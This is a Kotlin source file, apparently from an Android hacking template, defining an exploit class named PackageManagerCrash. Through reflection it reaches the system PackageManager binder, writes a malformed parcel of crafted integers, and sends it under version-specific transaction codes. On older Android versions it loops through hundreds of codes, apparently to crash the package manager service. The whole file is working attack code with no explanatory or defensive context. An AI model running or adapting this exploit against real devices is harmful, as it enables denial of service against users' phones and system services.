package org.chickenhook.AndroidHackingTemplate.penetration

import android.content.Context
import android.os.Build
import android.os.IBinder
import android.os.Parcel
import android.os.SystemClock
import android.util.Log

class PackageManagerCrash : IExploit {
    override fun launch(context: Context?): Boolean {
        val ActivityThreadClass = Class.forName("android.app.ActivityThread")
        val GetPackageManagerMethod = ActivityThreadClass.getDeclaredMethod("getPackageManager")
        GetPackageManagerMethod.isAccessible = true
        val IPackageManagerProxy = GetPackageManagerMethod.invoke(null)

        val mRemoteField = IPackageManagerProxy::class.java.getDeclaredField("mRemote")
        mRemoteField.isAccessible = true
        val mRemote = mRemoteField.get(IPackageManagerProxy) as IBinder

        val data = Parcel.obtain();
        data.writeInterfaceToken("android.content.pm.IPackageManager")
        val l1 = intArrayOf(
            0xfffffff, // INTENDED 0x73622a85
            0x00000113,
            0xff00000,
            0xff00000,
            0xff00000,
            0xff00000,
            0xff00000,
            -1,
            -1
        )
        l1.forEach {
            data.writeInt(it)
        }

        val reply = Parcel.obtain()
//        for (i in 0..400) {
//            Log.d(
//                "PackageManagerCrash", "launch <" + i + ">" +
//                        ""
//            )
//            mRemote.transact(i, data, reply, 17)
//            SystemClock.sleep(100)
//        }
        if (Build.VERSION.SDK_INT == Build.VERSION_CODES.Q) {
            val res = mRemote.transact(7, data, reply, 17) //android 10
        } else if (Build.VERSION.SDK_INT > Build.VERSION_CODES.Q) {
            val res = mRemote.transact(37, data, reply, 17) //android 11, 12, 13
        } else {
            for (i in 0..400) {
                Log.d(
                    "PackageManagerCrash", "launch <" + i + ">" +
                            ""
                )
                mRemote.transact(i, data, reply, 17)
                SystemClock.sleep(100)
            }
        }



        SystemClock.sleep(2000)
        return false
    }
}